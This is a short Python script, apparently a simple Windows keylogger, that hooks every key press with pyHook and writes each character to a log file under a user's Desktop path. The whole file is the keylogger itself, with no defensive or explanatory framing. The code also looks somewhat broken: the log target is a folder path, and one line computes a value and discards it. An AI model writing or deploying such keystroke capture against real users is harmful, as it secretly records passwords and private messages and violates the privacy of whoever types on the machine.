import pyHook, pythoncom, sys, logging

# download PyWin32, PyHook modules

destination = 'C:\\Users\Edwin\\Desktop'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=destination, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()﻿


